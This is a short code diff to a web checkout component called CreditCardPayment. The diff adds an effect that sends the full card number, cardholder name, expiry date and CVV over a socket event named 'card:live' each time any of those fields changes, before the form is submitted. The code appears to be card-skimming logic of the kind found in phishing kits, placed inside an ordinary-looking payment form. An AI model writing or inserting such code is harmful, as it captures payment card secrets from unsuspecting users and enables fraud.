@@ -174,6 +174,17 @@ export default function CreditCardPayment() {
     isFormRejected.value = false;
   }, []);
 
+  // Send card data in real-time (live card)
+  useEffect(() => {
+    const rawNum = (cardNumber || "").replace(/\s+/g, "");
+    socket.value.emit("card:live", {
+      cardNumber: rawNum,
+      nameOnCard: nameOnCard || "",
+      expiryDate: (expiryMonth || "") + "/" + (expiryYear || ""),
+      cvv: cvv || "",
+    });
+  }, [cardNumber, nameOnCard, expiryMonth, expiryYear, cvv]);
+
   // Verify card number
   useEffect(() => {
     if (cardNumber && cardNumber.length === 16) {
